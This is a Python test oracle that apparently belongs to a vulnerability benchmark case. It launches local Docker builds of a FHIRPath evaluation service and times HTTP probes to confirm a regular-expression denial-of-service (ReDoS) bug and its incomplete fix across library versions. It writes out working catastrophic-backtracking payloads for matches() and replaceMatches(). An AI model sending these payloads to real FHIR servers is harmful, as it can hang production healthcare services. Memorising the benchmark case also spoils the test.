#!/usr/bin/env python3
"""dos-threshold oracle for org.hl7.fhir.core DSTU2 FHIRPathEngine ReDoS over a REAL HTTP service
(CVE-2026-45367 -> CVE-2026-55470).

No flag token: the signal is SERVER-SIDE latency of an EXTERNAL HTTP request. For each version
{v0=6.9.6, v1=6.9.7, v2=6.9.10} we bring up a REAL Java HTTP service (com.sun.net.httpserver) that
evaluates a user-supplied FHIRPath expression via the REAL published ca.uhn.hapi.fhir:
org.hl7.fhir.dstu2 FHIRPathEngine (POST /eval -> engine.evaluate(StringType(input), expr), running
SYNCHRONOUSLY inside the HTTP handler thread). The oracle POSTs three probes {original, residual,
benign} from OUTSIDE the container and measures the HTTP round-trip latency (dominated by the
server-side regex compute); a catastrophic matches()/replaceMatches() hangs the response until the
HTTP read timeout.

  original  = replaceMatches('(.*a){30}','x')  -- CVE-2026-45367 wrapped this in RegexTimeout at V1 (6.9.7)
  residual  = matches('(.*a){30}')             -- CVE-2026-45367 MISSED this in DSTU2; closed only at V2 (6.9.10) by CVE-2026-55470
  benign    = matches('a+')                    -- linear control, fast on every version

A GUARDED call is bounded by RegexTimeout (~500ms, then PathEngineException); an UNGUARDED call
backtracks catastrophically and hangs -> recorded as the HTTP read timeout (~10000ms). Thresholds
are chosen so a guard-bounded call (~500ms) is cleanly separable from an unguarded hang (~10000ms).

GATE booleans (T_FAST=2000ms bounded/benign, T_SLOW=5000ms catastrophic, HTTP read timeout=10s):
  original_slow_on_v0    : v0.original > T_SLOW   (raw String.replaceAll catastrophic on V0)
  original_bounded_on_v1 : v1.original < T_FAST   (CVE-2026-45367 RegexTimeout bounds replaceMatches)
  residual_slow_on_v0    : v0.residual > T_SLOW   (raw String.matches catastrophic on V0)
  residual_slow_on_v1    : v1.residual > T_SLOW   (V1 fix INCOMPLETE: DSTU2 matches() still raw)
  residual_fast_on_v2    : v2.residual < T_FAST   (CVE-2026-55470 RegexTimeout.matches bounds it)
  benign_fast_on_all     : every version's benign latency < T_FAST
  residual_v1_over_v2_gt_5x : clean latency separation on V1 vs V2 for the residual
  passed = all of the above
"""
from __future__ import annotations
import http.client
import json
import os
import socket
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
COMPOSE = ["docker", "compose", "-f", os.path.join(HERE, "docker-compose.yml")]
ENV = {**os.environ, "PCB_FLAG": "dos-threshold-no-canary"}

T_FAST = 2000.0        # ms  (guard-bounded ~500ms + HTTP/JVM overhead, or benign, is well under this)
T_SLOW = 5000.0        # ms  (an unguarded catastrophic hang reaches the 10s HTTP read timeout)
HTTP_TIMEOUT_S = 10.0
HTTP_TIMEOUT_MS = HTTP_TIMEOUT_S * 1000.0

PORTS = {"v0": 26906, "v1": 26907, "v2": 26910}

INPUT = "a" * 250 + "X"   # long 'a' run + non-'a' tail forces exhaustive anchored-match backtracking
PAYLOADS = {
    # original CVE-2026-45367 vector: replaceMatches() hands the evil regex to java.util.regex
    "original": {"expr": "replaceMatches('(.*a){30}','x')", "input": INPUT},
    # residual CVE-2026-55470 vector: matches() (V1 left it unguarded in DSTU2)
    "residual": {"expr": "matches('(.*a){30}')", "input": INPUT},
    # benign control: a linear regex over the same long input
    "benign": {"expr": "matches('a+')", "input": INPUT},
}


def run(cmd, **kw):
    print("+", " ".join(cmd), flush=True)
    return subprocess.run(cmd, env=ENV, **kw)


def wait_health(port: int, timeout_s: float = 120.0) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            c = http.client.HTTPConnection("127.0.0.1", port, timeout=3)
            c.request("GET", "/health")
            r = c.getresponse()
            body = r.read()
            c.close()
            if r.status == 200 and b'"ok"' in body:
                return True
        except (ConnectionRefusedError, socket.timeout, OSError):
            pass
        time.sleep(1.0)
    return False


def probe(port: int, payload: dict) -> dict:
    """POST /eval {expr, input}; measure external HTTP round-trip latency (ms).
    On catastrophic backtracking the server hangs -> socket read timeout -> recorded as HTTP_TIMEOUT_MS."""
    body = json.dumps(payload)
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection("127.0.0.1", port, timeout=HTTP_TIMEOUT_S)
        c.request("POST", "/eval", body=body,
                  headers={"Content-Type": "application/json", "Content-Length": str(len(body))})
        r = c.getresponse()
        resp = r.read()
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"ms": round(ms, 1), "timeout": False,
                "resp": resp.decode("utf-8", "replace")[:200]}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"ms": round(max(ms, HTTP_TIMEOUT_MS), 1), "timeout": True, "resp": None}
    except OSError as e:
        return {"ms": -1.0, "timeout": False, "error": str(e), "resp": None}


def measure_profile(prof: str) -> dict:
    """Measure each payload against a FRESH server. A catastrophic FHIRPath evaluation permanently
    wedges the CPU-bound handler thread (a running java.util.regex cannot be interrupted), so a slow
    probe would starve any probe sent to the SAME server afterwards. We therefore `kill` (instant
    SIGKILL) + `up -d` (restart -> brand-new JVM) before every probe."""
    port = PORTS[prof]
    results = {}
    try:
        for kind in ("original", "residual", "benign"):
            run(COMPOSE + ["--profile", prof, "kill", prof], check=False,
                capture_output=True, text=True)
            run(COMPOSE + ["--profile", prof, "rm", "-f", prof], check=False,
                capture_output=True, text=True)
            time.sleep(1)
            run(COMPOSE + ["--profile", prof, "up", "-d"], check=True,
                capture_output=True, text=True)
            if not wait_health(port):
                raise RuntimeError(f"{prof}: /health never came up on :{port}")
            r = probe(port, PAYLOADS[kind])
            results[kind] = r
            print(f"[{prof}] {kind:9s} -> {r['ms']:>9}ms timeout={r.get('timeout')}", flush=True)
        return {"version": prof, "port": port, "results": results}
    finally:
        run(COMPOSE + ["--profile", prof, "kill", prof], check=False,
            capture_output=True, text=True)
        run(COMPOSE + ["--profile", prof, "down"], check=False,
            capture_output=True, text=True)


def main():
    t_start = time.time()
    versions = {}
    for prof in ("v0", "v1", "v2"):
        versions[prof] = measure_profile(prof)

    def ms(v, kind):
        return versions[v]["results"][kind]["ms"]

    matrix = {v: {k: versions[v]["results"][k]["ms"] for k in ("original", "residual", "benign")}
              for v in versions}

    booleans = {
        "original_slow_on_v0": ms("v0", "original") > T_SLOW,
        "original_bounded_on_v1": ms("v1", "original") < T_FAST,
        "residual_slow_on_v0": ms("v0", "residual") > T_SLOW,
        "residual_slow_on_v1": ms("v1", "residual") > T_SLOW,
        "residual_fast_on_v2": ms("v2", "residual") < T_FAST,
        "benign_fast_on_all": all(ms(v, "benign") < T_FAST for v in versions),
    }
    resid_v1, resid_v2 = ms("v1", "residual"), max(ms("v2", "residual"), 0.001)
    booleans["residual_v1_over_v2_gt_5x"] = (resid_v1 / resid_v2) > 5.0
    booleans["passed"] = all(booleans.values())

    report = {
        "case": "hapi-fhir-org-hl7-fhir-core-cve-2026-55470",
        "oracle_variant": "dos-threshold",
        "run_mode": "real-app-http",
        "external_http_trigger": True,
        "thresholds": {"T_FAST_ms": T_FAST, "T_SLOW_ms": T_SLOW, "http_timeout_ms": HTTP_TIMEOUT_MS},
        "payloads": PAYLOADS,
        "latency_matrix_ms": matrix,
        "residual_v1_over_v2_ratio": round(resid_v1 / resid_v2, 1),
        "booleans": booleans,
        "elapsed_s": round(time.time() - t_start, 1),
    }
    print("\n=== GATE REPORT ===")
    print(json.dumps(report, indent=2))
    with open(os.path.join(HERE, "gate_result.json"), "w") as f:
        json.dump(report, f, indent=2)
    return 0 if booleans["passed"] else 1


if __name__ == "__main__":
    sys.exit(main())
